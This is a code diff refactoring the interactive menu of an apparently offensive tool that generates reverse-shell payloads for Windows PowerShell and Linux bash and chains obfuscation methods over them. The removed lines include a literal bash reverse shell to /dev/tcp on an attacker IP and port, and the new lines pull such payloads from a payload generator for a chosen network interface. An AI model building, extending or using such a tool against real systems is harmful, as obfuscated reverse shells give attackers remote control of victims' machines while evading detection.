@@ -122,7 +122,6 @@ def _render_obfuscator(
 
 def _run_obfuscator_loop(
     title: str,
-    label: str,
     base: str,
     methods: list[tuple[str, str, Callable]],
 ) -> tuple[str, list[str]]:
@@ -139,13 +138,10 @@ def _run_obfuscator_loop(
             cursor = (cursor - 1) % len(methods)
         elif ch == b'\x1b[B':
             cursor = (cursor + 1) % len(methods)
-        elif ch in (b'\r', b'\n'):
-            if "base64" in chain:
-                pass
-            else:
-                _, _, fn = methods[cursor]
-                current = fn(current)
-                chain.append(methods[cursor][0])
+        elif ch in (b'\r', b'\n') and "base64" not in chain:
+            _, _, fn = methods[cursor]
+            current = fn(current)
+            chain.append(methods[cursor][0])
         elif ch in (b'r', b'R'):
             current = base
             chain = []
@@ -195,7 +191,6 @@ def run_obfuscate_ui(iface: str | None, port: int) -> None:
                 elif ch in (b'q', b'Q', b'\x03'):
                     raise _Cancelled
 
-        ip = interfaces[selected_iface]
         gen = PayloadGenerator(port)
 
         os_cursor = 0
@@ -211,20 +206,21 @@ def run_obfuscate_ui(iface: str | None, port: int) -> None:
             elif ch in (b'q', b'Q', b'\x03'):
                 raise _Cancelled
 
+        payloads = gen.for_interface(selected_iface)
+        if payloads is None:
+            raise _Cancelled
         if os_cursor == 0:
-            base = gen.for_interface(selected_iface)["powershell"]
             final_payload, final_chain = _run_obfuscator_loop(
-                "Windows Payload Obfuscator", "powershell", base, WIN_METHODS
+                "Windows Payload Obfuscator", payloads["powershell"], WIN_METHODS
             )
             final_label = "powershell"
         else:
-            base = f"bash -i >& /dev/tcp/{ip}/{port} 0>&1"
             final_payload, final_chain = _run_obfuscator_loop(
-                "Linux Payload Obfuscator", "bash", base, LINUX_METHODS
+                "Linux Payload Obfuscator", payloads["bash (alt)"], LINUX_METHODS
             )
             final_label = "bash"
 
-    except _Cancelled:
+    except (_Cancelled, KeyboardInterrupt):
         pass
     finally:
         sys.stdout.write(_SHOW + _ALT_OFF + "\n")
